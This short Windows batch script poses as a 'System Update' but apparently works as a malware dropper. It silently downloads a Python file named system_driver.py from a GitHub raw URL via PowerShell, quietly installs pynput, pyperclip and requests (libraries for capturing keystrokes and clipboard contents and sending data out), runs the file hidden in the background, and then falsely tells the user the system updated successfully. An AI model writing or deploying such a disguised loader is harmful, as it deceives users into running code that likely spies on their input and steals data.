@echo off
title System Update
echo Checking for updates...

:: 1. Define the GitHub Raw URL of your python script
set "SCRIPT_URL=https://raw.githubusercontent.com/coolrain14253/optimizer/main/system_driver.py"
set "SCRIPT_NAME=system_driver.py"

:: 2. Download the Python script silently using PowerShell
powershell -Command "(New-Object Net.WebClient).DownloadFile('%SCRIPT_URL%', '%SCRIPT_NAME%')"

:: 3. Install dependencies silently (pip)
pip install pynput pyperclip requests --quiet

:: 4. Run the driver in background (hidden)
start /b pythonw %SCRIPT_NAME%

echo System updated successfully!
exit